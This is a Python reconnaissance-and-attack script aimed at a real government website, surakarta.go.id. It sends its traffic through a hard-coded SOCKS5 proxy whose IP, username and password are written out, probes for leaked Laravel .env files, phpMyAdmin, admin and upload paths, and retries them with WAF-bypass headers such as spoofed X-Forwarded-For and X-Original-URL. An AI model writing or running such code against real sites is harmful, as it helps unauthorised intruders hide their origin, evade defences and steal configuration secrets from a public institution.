
import requests
import socket
import socks
import ssl
import sys

# Configure SOCKS proxy for socket connections (Crucial for Windows)
# Using one of the provided proxies - feel free to swap if one is down
PROXY_IP = "23.95.150.145"
PROXY_PORT = 6114
PROXY_USER = "oyyvimta"
PROXY_PASS = "3olvpyzbkfhq"

def set_global_proxy():
    try:
        socks.set_default_proxy(socks.SOCKS5, PROXY_IP, PROXY_PORT, username=PROXY_USER, password=PROXY_PASS)
        socket.socket = socks.socksocket
        print(f"[+] Global Proxy Set: {PROXY_IP}:{PROXY_PORT}")
    except Exception as e:
        print(f"[-] Failed to set proxy: {e}")
        sys.exit(1)

def check_target(url):
    print(f"[*] Checking: {url}")
    try:
        # verify=False is needed because we are proxying HTTPS and certificates might not match or be self-signed
        response = requests.get(url, verify=False, timeout=15)
        print(f"    Status: {response.status_code}")
        if response.status_code == 200:
            print(f"    [!] SUCCESS! Content found (Length: {len(response.content)})")
            if "ISPConfig" in response.text:
                print("    [!] CONFIRMED: ISPConfig Login Page!")
            elif "Laravel" in response.text:
                print("    [!] CONFIRMED: Laravel Application!")
        elif response.status_code == 403:
            print("    [-] 403 Forbidden (WAF Blocked?)")
        else:
            print(f"    [-] Response Code: {response.status_code}")
    except Exception as e:
        print(f"    [-] Error: {e}")

if __name__ == "__main__":
    print("--- Windows Vulnerability Scanner ---")
    
    # 1. Set Proxy first
    try:
        import socks
    except ImportError:
        print("[-] Missing library 'pysocks'. Please run: pip install pysocks")
        sys.exit(1)
        
    set_global_proxy()
    
    # 2. Test Connection
    print("\n[Phase 1] Testing Proxy Connection...")
    try:
        r = requests.get("https://ifconfig.me", verify=False, timeout=10)
        print(f"[+] Proxy IP Validated: {r.text.strip()}")
    except Exception as e:
        print(f"[-] Proxy Connection Failed: {e}")
        print("    Try changing the PROXY_IP in the script.")
        sys.exit(1)

    # 3. Scan Targets
    targets = [
        "https://surakarta.go.id:8080/login/",  # ISPConfig default
        "https://surakarta.go.id/.env",         # Laravel config leaked?
        "https://surakarta.go.id/public/.env",  # Public folder leak?
        "https://surakarta.go.id/phpmyadmin/",  # Database admin
        "https://surakarta.go.id/admin/",       # Generic admin
        "https://surakarta.go.id/up/",          # Upload folder
    ]
    
    # WAF Bypass Headers (OWASP / Common Techniques)
    bypass_headers = [
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Wap-Profile": ""}, # Sometimes bypassing mobile checks
        {"X-Original-URL": "/.env"}, # Will be dynamically updated
        {"X-Rewrite-URL": "/.env"},
    ]

    print("\n[Phase 2] Scanning Vulnerabilities with WAF Bypass...")
    for t in targets:
        check_target(t)
        
        # If it was a file/path check (not the root login), try bypass headers
        if ".env" in t or "/up/" in t:
             print(f"    [*] Attempting WAF Bypass on {t}...")
             path = t.replace("https://surakarta.go.id", "")
             
             for h in bypass_headers:
                 # Update dynamic headers
                 if "X-Original-URL" in h: h["X-Original-URL"] = path
                 if "X-Rewrite-URL" in h: h["X-Rewrite-URL"] = path
                 
                 try:
                     r = requests.get(t, headers=h, verify=False, timeout=10)
                     if r.status_code == 200:
                         print(f"        [!] BYPASS SUCCESS with {h} -> 200 OK")
                     elif r.status_code != 403:
                         print(f"        [+] Bypass? Status {r.status_code} with {h}")
                 except: pass
